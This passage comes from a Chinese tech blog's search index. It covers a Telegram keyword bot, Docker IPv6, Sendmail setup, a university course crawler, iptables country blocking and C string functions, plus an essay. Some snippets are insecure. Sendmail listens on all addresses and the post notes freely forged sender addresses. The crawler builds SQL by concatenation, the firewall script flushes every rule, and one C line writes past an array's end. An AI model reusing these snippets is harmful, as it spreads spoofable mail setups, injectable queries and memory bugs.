","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:5","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#正则表达式进行匹配"},{"categories":["coding"],"content":"一次回复多条消息 有些时候一条消息无法满足回复的需求，需要机器人同时返回多个消息，这也是支持的。 你只需要用 || 将多个回复内容间隔开就可以了。 /add 关键词===回复文字1||回复文字2||回复文字3 不同种类的回复内容也可以混合在一起，请随意混搭 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 关键词=== 请欣赏 || photo::图片链接 || video::视频链接 || 如果需要更多内容，你可以下载软件 || file::文件链接 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:6","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#一次回复多条消息"},{"categories":["coding"],"content":"回复随机消息 有一个群组提出了这样一个特定需求，想要从设置好的回复内容中随机回复一个，这也是支持的。 使用方法： random{回复内容1$$回复内容2$$回复内容3}，使用两个英文的$符号间隔。 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 关键词=== random::{ 一条消息 $$ photo::PHOTO_URL $$ 另一条消息 } 在这个关键词规则里，机器人将自动从三条消息中选择一个发出。 你可以结合上面一个使用方法，让规则更加灵活 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 小白兔=== 你也喜欢小白兔呀，送你一张小白兔的照片 || random::{ photo::照片链接1 $$ photo::照片链接2 $$ photo::照片链接3 } || 如果喜欢可以下载软件获取更多图片 || file::文件的链接 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:7","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#回复随机消息"},{"categories":["coding"],"content":"自动删除消息 大多数时候我们需要屏蔽一些关键词，防止用户讨论相关内容，比如说政治、色情、黑产等内容。 机器人既然可以识别关键词，就可以进行相关消息删除操作，你需要给机器人删除消息的管理员权限。 /add 日站===delete 这样机器人就会将含有 日站 二字的消息自动删除，起到屏蔽的作用，你可以使用正则进行更加灵活的匹配。 直接删除可能不太友好，你可以结合前面的内容进行优化，比如结合多个回复内容进行添加提示语。 /add 日站===本群禁止讨论黑产相关内容||delete 这样的规则机器人就会先回复“本群禁止讨论黑产相关内容”，然后再进行删除。 注意：delete一定要放在最后，否则回复消息发送不出来。 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:8","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#自动删除消息"},{"categories":["coding"],"content":"自动禁言\\踢人 只删除还不过瘾，有人刷消息？禁言和踢人同样支持。 禁言 /add keyword===ban 会自动禁言发送keyword的用户 永久 禁言特定时长 /add keyword===ban::3d6h20m36s 会自动禁言发送keyword的用户 3天6个小时20分钟36s 时长信息4个时间单位不必全部写满，时长换算成秒如果低于30s意味着永久禁言，多于1年也是永久禁言 踢人 /add 日站===kick 你还是可以结合上面的内容进行优化，因为delete、ban、kick也是回复种类之一，所以跟文字、照片、视频、文件等的使用方法相同，也就可以进行组合。 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:9","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#自动禁言踢人"},{"categories":["coding"],"content":"屏蔽特定后缀文件 有人发送exe\\com\\bat等后缀的病毒？不用再去找其他机器人了，使用自定义规则即可完成屏蔽和禁言。 /add re:(\\.exe|\\.scr|\\.cpl|\\.com|\\.cmd|\\.bat|\\.vbs)$===ban 这样带有exe\\src\\cpl\\com\\cmd\\bat\\vbs等可执行后缀的文件就会被自动删除，相关发送者就会被禁言。 关键词功能可以根据每个群组添加的不同的关键词规则实现一些简单的回复或者更加复杂的操作，通过组合等方式来实现相应功能完全看你的规则，所以发挥你的脑洞吧。 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:10","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#屏蔽特定后缀文件"},{"categories":["coding"],"content":"进群欢迎和退群欢送 机器人可以设置欢迎和欢送文字 需要使用 /welcome 和 /goodbye 命令分别开启 /welcome 开启后，可以设置内容 /setwelcometext 欢迎 $username 加入 $groupname 这个大家庭 /goodbye 开启后，可以设置内容 /setgoodbyetext $username离开了我们群 注意：加群欢迎和退群欢送文字默认开启markdown语法 使用 $userid 自动替换 用户id, $username 自动替换用户名 使用 $groupid 自动替换 群组id， $groupname 自动替换群组名 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:11","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#进群欢迎和退群欢送"},{"categories":["coding"],"content":"回复按钮 看样子很多人需要这个功能，就加上了 示例： /add test===button::{\"text\": \"测试按钮消息，支持_Markdown_\",\"buttons\": [[{\"text\":\"百度\",\"url\":\"https://baidu.com\"},{\"text\":\"谷歌\",\"url\":\"https://google.com\"},{\"text\":\"拾取\",\"url\":\"http://t.me/peekfun\"}],[{\"text\":\"百度\",\"url\":\"https://baidu.com\"},{\"text\":\"谷歌\",\"url\":\"https://google.com\"}]]} button::后面的json格式如下 { \"text\": \"测试按钮消息，支持_Markdown_\", // 这里是回复的消息内容，支持markdown，群组名替换啥的 \"buttons\": [ // 按钮列表 // 第一行按钮 [ {\"text\":\"百度\",\"url\":\"https://baidu.com\"}, {\"text\":\"谷歌\",\"url\":\"https://google.com\"}, {\"text\":\"拾取\",\"url\":\"http://t.me/peekfun\"} ], // 第二行按钮 [ {\"text\":\"百度\",\"url\":\"https://baidu.com\"}, {\"text\":\"谷歌\",\"url\":\"https://google.com\"} ] ] } ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:12","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#回复按钮"},{"categories":["coding"],"content":"命令列表 help - 查看帮助 add - 添加规则 del - 删除规则 list - 列出规则 admin - 呼叫管理员 banme - 禁言小游戏 getid - 查看用户的信息 可回复查看别人 autoreply - 开关自动回复功能 autodelete - 开关自动删除消息功能 replyorder - 开关回复ban/kick命令功能 banmegame - 开关禁言小游戏功能 playorderban - 开关玩命令惩罚功能 banqingzhen - 开关防清真功能 calladmin - 开关呼叫管理员功能 welcome - 开关加群欢迎功能 goodbye - 开关离群送别功能 deletejoinmessage - 开关删除加群消息功能 servicelist - 查看机器人功能列表 deleteallrules - 清空本群所有关键词规则 deleteallmessage - 删除48小时内所有消息 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:3:0","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#命令列表"},{"categories":["coding"],"content":"开源 开源地址： https://github.com/zu1k/tg-keyword-reply-bot ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:4:0","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#开源"},{"categories":["Docker"],"content":"ipv6不断普及，ipv6地址多的数不胜数，机房给单台机器分配的ipv6段达到了可怕的64位长度的子网主机号。 那我不禁在想，能不能给docker下的每个容器独立的ipv6地址，这样就不需要映射端口号了。 所以就有了以下实践： 首先，给docker engine开启ipv6支持, 参考： https://docs.docker.com/config/daemon/ipv6/ 配置/etc/docker/daemon.json文件如下。 { \"ipv6\": true, \"fixed-cidr-v6\": \"2001🔢5001🔢:/64\" } 执行 systemctl reload docker 重载Docker Engine的配置文件 这样docker默认的bridge网络就会给容器分配随机的ipv6地址了。 但是我们通常需要固定的ipv6地址，所以需要添加自定义网桥网络 docker network create \\ -d bridge --ipv6 \\ --subnet \"2001🔢5001🔢6666::/80\" \\ --gateway=\"2001🔢5001🔢6666::1\" \\ --subnet=172.28.0.0/16 \\ --gateway=172.28.0.1 ipv6 然后启动docker容器时候指定ipv6网桥和ipv6地址 docker run -itd -P --ip=172.28.0.101 \\ --ip6=\"2001🔢5001🔢6666::101\" \\ --network=ipv6 \\ --name=ipv6test \\ ubuntu:18.04 /bin/bash 此时容器已经有独立的ipv6地址了，我们发现向外访问可以访问，但是外界访问不到docker后面隐藏的container 这是因为ipv6使用NDP协议，我们需要在容器的宿主机上设置 ndp代理 sysctl net.ipv6.conf.ens3.proxy_ndp=1 ens3是我的宿主机外网网卡，这里需要替换成你自己的 这里每一个docker分配的ipv6地址都需要添加这样一条规则 ip -6 neigh add proxy 2001🔢5001🔢6666::101 dev ens3 ","date":"2019-08-31","objectID":"https://zu1k.com/posts/coding/set-ipv6-for-every-docker-container/:0:0","series":null,"tags":["Docker","IPv6"],"title":"给docker里的每一个容器一个独立的ipv6地址","uri":"https://zu1k.com/posts/coding/set-ipv6-for-every-docker-container/#"},{"categories":["writing"],"content":" 木兰花令——人生若只如初见 纳兰性德 人生若只如初见，何事秋风悲画扇。 等闲变却故人心，却道故人心易变。 骊山语罢清宵半，泪雨零铃终不怨。 何如薄幸锦衣郎，比翼连枝当日愿。 网上看到一篇散文，很喜欢，就摘了过来。 人生若只如初见，所有往事都化为江南的一场烟雨，在相视一笑中，随风荡漾起回忆的波纹，然后再渐渐隐去在画中的江南，只因为你的离去，我竟为你留下的惊艳，倾情伤怀。 时光太匆匆，我们总也回不到过去，也许曾一见倾心，但再见之时，也许，是伤心之时。若是如此，在那分离的一刻，我怎么也不会让你离去，怎么也不会让定格在唯美初遇的时光流逝，我只期望那一刻可以定格一万年。 初见惊艳，再见依然，这只是一个美好的愿望，蓦然回首，曾经沧海桑田，早已换了人间，再也寻不到灯火阑珊处那一抹清纯的微笑。 人生若只如初见，何事秋风悲画屏？等闲变却故人心，却道故人心易变，骊山语罢消宵半，夜雨零铃终不怨，何如薄幸锦儿衣，比翼连理当日愿。纳兰长于情，深于情，直抒无奈忧郁情，我的伤心又怎不是因情而起？ 人生若只如初见该多好，让那种自然，那种回忆，那种真诚，一直弥漫在生命之中，该多好啊。为什么人与人之间会有误会，会有费解，会有猜测和非议呢？为什么还有冷落，争吵和疏远呢？为什么？ 初遇是一场美丽的梦，美丽的梦和美丽的诗一样，都是可遇而不可求的，常常在最没料想到的时刻出现，在最没料想到的时刻消失。 在这场不该有我的梦里，我依然在期盼，一切可以重新开始，一切都可以慢慢解释，想象之中还能再回到初遇时的欣喜和感动。在梦里你依然如故，在我眼前，你的微笑，一如那年那月那时那分那秒，依旧让我那么心动。 每个人都会有初遇的情结，像一杯清水那般清纯透明，透明中包含着一种叫做永不会再来的幸福，稍纵即逝，有的人拼命的想抓住，拼命的追寻，可他还是如烟随风，轻轻流逝再也不见了，初遇的情怀，是一场淡淡的清风，太过执着了，便迷失了自己，惹一世的忧伤。让他自由吧，只留一丝在梦里，安慰曾经渴望的心。 有一种情怀你不会明白，你永远明白不了，因为它是属于我自己的，也许你我仅仅错过了一秒，就已注定已错过了今生。 人生若只如初见，忧伤的美丽只能注定定格在回忆中。也许哪天，转身而去，留下一个美丽远去的背影，完美的弧线，会诉说着对昨天依恋。 人生若只如初见，不舍的眼眸只为停留在离去的那刻，也许哪天你出现在我的梦里。倾城的微笑，会解释着那些年的思念。 人生如此，浮生若萍，相逢情缘深？相恋情缘浅！辗转一季花开花落，不变的容颜下，是否还有一颗不曾改变的心？情生情死若一场烟花雨，最终还是不见了踪影。初遇时情真至深，再见时，唯有一滴伤心断肠泪，一抹忧伤忘怀笑。擦肩而过，回头看，不曾见。来时伴…… ","date":"2018-12-03","objectID":"https://zu1k.com/posts/life/if-time-could-stop-at-the-moment-when-we-first-met/:0:0","series":null,"tags":["writing"],"title":"人生若只如初见","uri":"https://zu1k.com/posts/life/if-time-could-stop-at-the-moment-when-we-first-met/#"},{"categories":["coding"],"content":"通过Sendmail服务发送邮件 系统centos7 需要开启25端口 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:0","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#"},{"categories":["coding"],"content":"安装sendmail yum -y install sendmail sendmail-cf ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:1","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#安装sendmail"},{"categories":["coding"],"content":"安装MTA功能测试用软件 yum -y install mailx php ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:2","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#安装mta功能测试用软件"},{"categories":["coding"],"content":"切换系统的邮件发送接口 alternatives --config mta 画面显示： There are 2 programs which provide 'mta'. Selection Command ----------------------------------------------- + 1 /usr/sbin/sendmail.postfix * 2 /usr/sbin/sendmail.sendmail Enter to keep the current selection[+], or type selection number: 2 输入2后回车即把MTA功能切换到sendmail上，+号会显示在sendmail的行头。 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:3","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#切换系统的邮件发送接口"},{"categories":["coding"],"content":"配置sendmail vi /etc/mail/sendmail.mc DAEMON_OPTIONS(\\`Port=smtp,Addr=127.0.0.1, Name=MTA\\')dnl 把Addr的值从127.0.0.1修改为0.0.0.0，不限制使用MTA的IP。 m4 /etc/mail/sendmail.mc \u003e /etc/mail/sendmail.cf 生成正式的配置文件。 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:4","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#配置sendmail"},{"categories":["coding"],"content":"重启并测试功能 reboot -f 重启完成后确认MTA程序已经切换到sendmail ps aux | grep sendmail root 1003 0.0 0.2 88688 2280 ? Ss 10:40 0:00 sendmail: accepting connections smmsp 1018 0.0 0.1 84120 1912 ? Ss 10:40 0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue root 1141 0.0 0.0 112660 968 pts/1 R+ 10:51 0:00 grep --color=auto sendmail sendmail的相关进程已经启动 ps aux | grep postfix root 1161 0.0 0.0 112660 968 pts/1 R+ 11:04 0:00 grep --color=auto postfix postfix的相关进程都没有开启 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:5","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#重启并测试功能"},{"categories":["coding"],"content":"用PHP函数发送邮件 php -a 在PHP的交互界面下输入以下函数 mail('test@sohu.com', \"Test email content\", \"sendmail title\", null, \"-f testname@sendmail.com\"); 使用PHP接口做测试的好处是可以随意指定发送方的邮件地址，即mail函数的最后一个参数。 即使系统的hostname未设置也可以正常发送出邮件。 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:6","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#用php函数发送邮件"},{"categories":["coding"],"content":"使用linux的mail命令发送邮件 mail命令就没有使用自定义的邮件发送地址，而是使用HOSTNAME。 安装系统时由于没有对hostname做特别设置，HOSTNAME的值是默认的 localhost.localdomain 这样的邮件域名会被大多数邮箱如163，QQ拒收。 查看邮件发送log会发现以下错误 cat /var/log/maillog dsn=4.1.8, stat=Deferred: 450 4.1.8 \u003croot@localhost.localdomain\u003e: Sender address rejected: Domain not found 修改HOSTNAME vi /etc/hosts 在最后加上一行 192.168.2.108 intest.com 这里的IP地址是我跑sendmail虚拟机的IP，需根据实际情况设置 其实这个文件hosts只是用来设置本地路由表，但填上本机IP时，系统在启动初始化中查到本机IP在hosts中，就会用hosts文件中对应的域名来设置HOSTNAME。 重新启动 reboot -f 重启后发现本地的DNS配置文件etc/resolv.conf 已经被自动更新。 内容变成 nameserver 192.168.2.1 执行mail命令发送邮件 echo \"test mail content\"|mail -s \"Mail title\" test@sohu.com ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:0:7","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#使用linux的mail命令发送邮件"},{"categories":["coding"],"content":"补充 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:1:0","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#补充"},{"categories":["coding"],"content":"切换系统的邮件发送接口 alternatives --config mta Postfix是Centos7系统默认自带。 也可以用命令 yum list installed | grep postfix 确认 选择postfix所在行的编号后回车 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:1:1","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#切换系统的邮件发送接口-1"},{"categories":["coding"],"content":"重启并测试功能 reboot -f 重启后查看进程看到postfix相关的进程已经启动 ps aux | grep postfix root 1093 0.0 0.2 89544 2172 ? Ss 08:55 0:00 /usr/libexec/postfix/master -w postfix 1094 0.0 0.4 89648 4016 ? S 08:55 0:00 pickup -l -t unix -u postfix 1095 0.0 0.4 89716 4044 ? S 08:55 0:00 qmgr -l -t unix -u postfix 1237 0.0 0.4 89796 4072 ? S 09:08 0:00 cleanup -z -t unix -u postfix 1238 0.0 0.4 89652 4024 ? S 09:08 0:00 trivial-rewrite -n rewrite -t unix -u postfix 1239 0.0 0.4 89856 4272 ? S 09:08 0:00 smtp -t unix -u root 1274 0.0 0.0 112660 972 pts/1 R+ 09:09 0:00 grep --color=auto postfix 系统的hostname已经在sendmail配置的第六步中完成了配置，这里就直接使用PHP与mail命令 两种方法做测试。 php -a mail('test@sohu.com', \"Test email No1\", \"postfix mail\", null, \"-f test@ccfst.com\"); * php的mail函数可以随意指定发送地址 echo \"test mail\"|mail -s \"postfix mail title\" test@sohu.com ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/:1:2","series":null,"tags":["EMail","PHP","Linux"],"title":"通过Sendmail服务发送邮件","uri":"https://zu1k.com/posts/coding/send-mail-via-endmail-service/#重启并测试功能-1"},{"categories":["coding"],"content":"环境python3.6 # -*- coding:utf-8 -*- import sys import requests import hashlib import json import pymysql # Initialize Session s = requests.Session() ua = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0\"} s.headers.update(ua) def login(): username = \"201700301234\" password = \"123456\".encode() # Get cookies s.get(\"http://bkjwxk.sdu.edu.cn\") # Set properties to login hs = hashlib.md5() hs.update(password) password = hs.hexdigest() data = \"j_username=\" + username + \"\u0026j_password=\" + password headers = { \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Referer\": \"http://bkjwxk.sdu.edu.cn/f/login\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\" } r = s.post(\"http://bkjwxk.sdu.edu.cn/b/ajaxLogin\", data=data, headers=headers) # Check if is successful if r.text != \"\\\"success\\\"\": print(\"登陆出错\") print(\"Detailed message: \") print(r.text) sys.exit() print(\"登陆成功\") # get one page data def onepage(i): data = \"type=kc\u0026currentPage=\" + i + \"\u0026kch=\u0026jsh=\u0026skxq=\u0026skjc=\u0026kkxsh=\" headers = { \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Referer\": \"http://bkjwxk.sdu.edu.cn/f/common/main\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\" } r = s.post(\"http://bkjwxk.sdu.edu.cn/b/xk/xs/kcsearch\", data=data, headers=headers) return json.loads(r.text) # 向数据库插入一条数据 def insertone(index, kch, kxh, kcm, xf, kclb, kclbmc, kkxsh, kkxsm, kkxsjc, jsh, ksm, sjdd): # 打开数据库连接 db = pymysql.connect(\"localhost\", \"kc\", \"kc\", \"kc\", charset='utf8') # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 插入语句 sql = \"INSERT INTO kcinfo(`id`,`kch`,`kxh`,`kcm`,`xf`,`kclb`,`kclbmc`,`kkxsh`,`kkxsm`,`kkxsjc`,`jsh`,`ksm`,`sjdd`) VALUES ('\" + index + \"','\" + kch + \"','\" + kxh + \"','\" + kcm + \"','\" + xf + \"','\" + kclb + \"','\" + kclbmc + \"','\" + kkxsh + \"','\" + kkxsm + \"','\" + kkxsjc + \"','\" + jsh + \"','\" + ksm + \"','\" + sjdd + \"')\" try: # 执行sql语句 cursor.execute(sql) # 提交到数据库执行 db.commit() except: print(sql) # 如果发生错误则回滚 db.rollback() def godata(i): js = onepage(i) for result in js[\"object\"][\"resultList\"]: kch = result[\"KCH\"] if kch is not None else \"\" # 课程号 kxh = str(result[\"KXH\"]) if kxh is not None else \"\" # 课序号 kcm = result[\"KCM\"] # 课程名 if not kcm: kcm = \"\" xf = str(result[\"XF\"]) # 学分 if not xf: xf = \"0\" kclb = result[\"KCLB\"] # 课程类别 if not kclb: kclb = \"\" kclbmc = result[\"KCLBMC\"] # 课程类别名称 if not kclbmc: kclbmc = \"\" kkxsh = result[\"KKXSH\"] # 开课学院号 if not kkxsh: kkxsh = \"\" kkxsm = result[\"KKXSM\"] # 开科学院名 if not kkxsm: kkxsm = \"\" kkxsjc = result[\"KKXSJC\"] # 开课学院简称 if not kkxsjc: kkxsjc = \"\" jsh = str(result[\"JSH\"]) # 教师号 if not jsh: jsh = \"0\" ksm = result[\"JSM\"] # 教师名 if not ksm: ksm = \"\" sjdd = result[\"SJDD\"] # 上课时间/地点 if not sjdd: sjdd = \"\" index = str(result[\"NUM\"]) # 序号 无用 if not index: index = \"0\" # 插 insertone(index, kch, kxh, kcm, xf, kclb, kclbmc, kkxsh, kkxsm, kkxsjc, jsh, ksm, sjdd) login() for i in range(1, 173): godata(str(i)) print(\"第\" + str(i) + \"页完成\") ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database/:0:0","series":null,"tags":["Python"],"title":"爬取教务系统所有课程并存入数据库","uri":"https://zu1k.com/posts/coding/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database/#"},{"categories":["coding"],"content":"搭建了一个MTProxy，分享出去，最后发现网速跑满，连接ip数高达600多，并且还在不断增加。 查看ip来源后发现九成以上是伊朗人，后来知道原来tg在他们国家被封了，所以才导致如此。 所以想办法屏蔽这些ip，准确的说是一整个国家的ip,或者说是一堆ip ","date":"2018-12-03","objectID":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/:0:0","series":null,"tags":["ipset","iptables"],"title":"屏蔽一个国家所有IP","uri":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/#"},{"categories":["coding"],"content":"使用iptables添加规则 方法如下： 1.下载一个国家的ip段，网址：http://www.ipdeny.com/ipblocks/ wget http://www.ipdeny.com/ipblocks/data/countries/ir.zone 2.使用脚本批量添加iptables规则 #!/bin/bash # Block traffic from a specific country COUNTRY=\"ir\" IPTABLES=/sbin/iptables EGREP=/bin/egrep if [ \"$(id -u)\" != \"0\" ]; then echo \"you must be root\" 1\u003e\u00262 exit 1 fi resetrules() { $IPTABLES -F $IPTABLES -t nat -F $IPTABLES -t mangle -F $IPTABLES -X } resetrules for c in $COUNTRY do country_file=$c.zone IPS=$($EGREP -v \"^#|^$\" $country_file) for ip in $IPS do echo \"blocking $ip\" $IPTABLES -A INPUT -s $ip -j DROP done done iptables-save exit 0 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/:1:0","series":null,"tags":["ipset","iptables"],"title":"屏蔽一个国家所有IP","uri":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/#使用iptables添加规则"},{"categories":["coding"],"content":"使用ipset添加ip集合 发现用iptables直接添加ip实在低效，可以用其扩展ipset直接添加一个集合。 什么是IP集? 这时候就是IP集登场了。IP集是一个内核特性，它允许多个（独立）IP地址、MAC地址或者甚至是端口号被编码和有效地存储在位图/哈希内核数据结构中。一旦IP集创建之后，你可以创建一条iptables规则来匹配这个集合。 你马上就会看见IP集合的好处了，它可以让你用一条iptable规则匹配多个ip地址！你可以用多个IP地址和端口号的方式来构造IP集，并且可以动态地更新规则而没有性能影响。 在Linux中安装IPset工具 为了创建和管理IP集，你需要使用称为ipset的用户空间工具。 要在Debian、Ubuntu或者Linux Mint上安装： $ sudo apt-get install ipset Fedora或者CentOS/RHEL 7上安装： $ sudo yum install ipset 使用IPset命令禁止IP 让我通过简单的示例告诉你该如何使用ipset命令。 首先，让我们创建一条新的IP集，名为banthis（名字任意）： $ sudo ipset create banthis hash:net 第二个参数(hash:net)是必须的，代表的是集合的类型。IP集有多个类型。hash:net类型的IP集使用哈希来存储多个CIDR块。如果你想要在一个集合中存储单独的IP地址，你可以使用hash:ip类型。 一旦创建了一个IP集之后，你可以用下面的命令来检查： $ sudo ipset list 这显示了一个可用的IP集合列表，并有包含了集合成员的详细信息。默认上，每个IP集合可以包含65536个元素（这里是CIDR块）。你可以通过追加\"maxelem N\"选项来增加限制。 $ sudo ipset create banthis hash:net maxelem 1000000 现在让我们来增加IP块到这个集合中： $ sudo ipset add banthis 1.1.1.1/32 $ sudo ipset add banthis 1.1.2.0/24 $ sudo ipset add banthis 1.1.3.0/24 $ sudo ipset add banthis 1.1.4.10/24 这一步可以使用shell脚本自动添加 你会看到集合成员已经改变了。 $ sudo ipset list 现在是时候去创建一个使用IP集的iptables规则了。这里的关键是使用\"-m set –match-set “选项。 现在是时候去创建一个使用IP集的iptables规则了。这里的关键是使用”-m set –match-set “选项。 现在让我们创建一条让之前那些IP块不能通过80端口访问web服务的iptable规则。可以通过下面的命令： $ sudo iptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 80 -j DROP 如果你愿意，你可以保存特定的IP集到一个文件中，以后可以从文件中还原： $ sudo ipset save banthis -f banthis.txt $ sudo ipset destroy banthis $ sudo ipset restore -f banthis.txt ","date":"2018-12-03","objectID":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/:2:0","series":null,"tags":["ipset","iptables"],"title":"屏蔽一个国家所有IP","uri":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/#使用ipset添加ip集合"},{"categories":["coding"],"content":"自用脚本 #!/bin/bash EGREP=/bin/egrep con_file=$1.zone ipset=$1ip wget http://www.ipdeny.com/ipblocks/data/countries/$con_file ipset creat $ipset hash:net IPS=$($EGREP -v \"^#|^$\" $con_file) for ip in $IPS do ipset add $ipset $ip done rm $con_file iptables -I INPUT -m set --match-set $ipset src -p tcp --destination-port 6666 -j DROP iptables-save exit 0 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/:3:0","series":null,"tags":["ipset","iptables"],"title":"屏蔽一个国家所有IP","uri":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/#自用脚本"},{"categories":["coding"],"content":"参考文章： 在Linux下实现批量屏蔽IP地址的方法 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/:4:0","series":null,"tags":["ipset","iptables"],"title":"屏蔽一个国家所有IP","uri":"https://zu1k.com/posts/linux/block-all-ips-in-a-country/#参考文章"},{"categories":["coding"],"content":" rember this strncpy(a,b,5); a[5]='\\0'; char a[10]; memset(a,'#',sizeof(a)); a[10]='\\0'; 刚开始学C/C++时，一直对字符串处理函数一知半解，这里列举C/C++字符串处理函数，希望对初学者有一定的帮助。 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:0:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#"},{"categories":["coding"],"content":"C： char st[100]; 字符串长度 strlen(st); 字符串比较 strcmp(st1,st2); //把st1,st2的前n个进行比较。 strncmp(st1,st2,n); 附加 strcat(st1,st2); strncat(st1,st2,n); //n表示连接上st2的前n个给st1，在最后不要加'\\0'。 替换 strcpy(st1,st2); strncpy(st1,st2,n); //n表示复制st2的前n个给st1，在最后要加'\\0'。 查找 where = strchr(st,ch) //ch为要找的字符。 where = strspn(st1,st2); //查找字符串。 where = strstr(st1,st2); 